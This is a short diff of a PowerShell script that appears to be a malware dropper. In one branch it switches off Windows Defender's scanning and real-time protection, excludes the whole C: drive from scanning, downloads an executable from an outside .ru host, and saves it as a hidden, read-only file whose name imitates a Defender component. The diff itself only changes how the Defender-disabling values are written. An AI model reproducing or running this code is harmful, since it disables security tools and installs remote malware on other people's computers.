@@ -13,15 +13,15 @@ switch ($n)
 		} 
         2 
 		{
-		Set-MpPreference -DisableScriptScanning True
-                Set-MpPreference -DisableArchiveScanning True
-                Set-MpPreference -DisableAutoExclusions True
-                Set-MpPreference -DisableBehaviorMonitoring True
-                Set-MpPreference -DisableBlockAtFirstSeen True
-                Set-MpPreference -DisableIOAVProtection True
-                Set-MpPreference -DisablePrivacyMode True
-                Set-MpPreference -DisableRealtimeMonitoring True
-                Set-MpPreference -DisableRealtimeMonitoring True
+		Set-MpPreference -DisableScriptScanning 1
+                Set-MpPreference -DisableArchiveScanning 1
+                Set-MpPreference -DisableAutoExclusions 1
+                Set-MpPreference -DisableBehaviorMonitoring 1
+                Set-MpPreference -DisableBlockAtFirstSeen 1
+                Set-MpPreference -DisableIOAVProtection 1
+                Set-MpPreference -DisablePrivacyMode 1
+                Set-MpPreference -DisableRealtimeMonitoring 1
+                Set-MpPreference -DisableRealtimeMonitoring 1
                 Add-MpPreference -ExclusionPath C:\
 		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
 		Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
